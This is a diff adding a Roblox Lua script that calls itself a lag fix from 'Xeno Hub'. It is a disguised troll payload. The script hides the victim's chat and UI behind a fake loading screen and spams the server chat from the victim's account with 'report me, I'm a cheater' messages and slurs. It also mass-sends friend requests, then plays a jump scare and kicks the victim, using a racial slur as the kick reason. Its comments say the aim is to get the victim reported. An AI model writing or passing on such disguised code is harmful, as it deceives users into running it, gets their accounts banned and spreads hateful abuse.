@@ -1,0 +1,120 @@
+-- [[ ULTRA FIX LAG PC 2025 - BY XENO HUB ]] --
+
+local kickReason = "LOL NIGGER STUPID"
+local reportNote = "IM HACK LOL FUCK YOU ROBLOX"
+
+-- 1. VÔ HIỆU HÓA CHAT VÀ NÚT ROBLOX (BỊT MẮT)
+pcall(function()
+    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false) -- Ẩn sạch UI hệ thống
+end)
+
+-- 2. TẠO GIAO DIỆN LOADING GIẢ
+local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+local ScreenGui = Instance.new("ScreenGui", PlayerGui)
+ScreenGui.Name = "Xeno_Final_Lock"
+ScreenGui.DisplayOrder = 9999999
+ScreenGui.IgnoreGuiInset = true
+
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(1, 0, 1, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+MainFrame.Active = true
+
+local StatusText = Instance.new("TextLabel", MainFrame)
+StatusText.Size = UDim2.new(1, 0, 0, 50)
+StatusText.Position = UDim2.new(0, 0, 0.5, -20)
+StatusText.BackgroundTransparency = 1
+StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
+StatusText.TextSize = 22
+StatusText.Font = Enum.Font.Code
+StatusText.Text = "Xeno Hub: Universal Optimization Loading..."
+
+-- 3. HÀM GỬI TIN NHẮN (SERVER-SIDE)
+local function Say(msg)
+    local randomCode = ""
+    local chars = "abc123"
+    for i = 1, 5 do
+        local r = math.random(1, #chars)
+        randomCode = randomCode .. string.sub(chars, r, r)
+    end
+    local finalMsg = msg .. " // " .. randomCode
+    
+    local TextChatService = game:GetService("TextChatService")
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local channel = TextChatService.TextChannels.RBXGeneral
+        if channel then channel:SendAsync(finalMsg) end
+    else
+        local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+        if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
+            chatEvent.SayMessageRequest:FireServer(finalMsg, "All")
+        end
+    end
+end
+
+-- 4. HÀM GỬI KẾT BẠN CẢ SERVER
+local function FriendEveryone()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= game.Players.LocalPlayer then
+            pcall(function()
+                game.Players.LocalPlayer:RequestFriendship(player)
+                -- Lưu ý: Roblox không cho phép ghi note tùy chỉnh trong API RequestFriendship trực tiếp 
+                -- nhưng việc gửi kết bạn hàng loạt khi đang spam "IM HACKER" sẽ làm họ report ngay lập tức.
+            end)
+        end
+    end
+end
+
+task.spawn(function()
+    local isKicking = false
+    local messages = {
+        "script troll made by NOTHING",
+        "ez",
+        "PLS REPORT ME IM CHEATER",
+        "hahahah REPORT ME",
+        "LOL ez hahaha",
+        "IM HACK LOL FUCK YOU ROBLOX" -- Thêm câu này vào spam chat
+    }
+
+    -- SPAM CHAT + GỬI KẾT BẠN
+    task.spawn(function()
+        local msgIndex = 1
+        while not isKicking do
+            pcall(function() Say(messages[msgIndex]) end)
+            msgIndex = (msgIndex % #messages) + 1
+            
+            -- Cứ mỗi 10 giây lại gửi kết bạn lại một lần cho chắc
+            if msgIndex == 1 then FriendEveryone() end 
+            
+            task.wait(3.5)
+        end
+    end)
+
+    -- Hiệu ứng thanh Loading giả
+    task.spawn(function()
+        for i = 1, 100 do
+            if isKicking then break end
+            StatusText.Text = "Applying Patch: " .. i .. "%"
+            task.wait(0.6)
+        end
+        isKicking = true
+    end)
+
+    -- Khóa nhân vật
+    pcall(function() game.Players.LocalPlayer.Character.PrimaryPart.Anchored = true end)
+
+    repeat task.wait(1) until isKicking
+
+    -- 5. JUMP SCARE + KICK
+    local Sound = Instance.new("Sound", game.Workspace)
+    Sound.SoundId = "rbxassetid://4835664244" 
+    Sound.Volume = 10
+    Sound:Play()
+
+    for i = 1, 100 do
+        MainFrame.BackgroundColor3 = (i % 2 == 0) and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(0, 0, 0)
+        task.wait(0.02)
+    end
+
+    game.Players.LocalPlayer:Kick(kickReason)
+end)
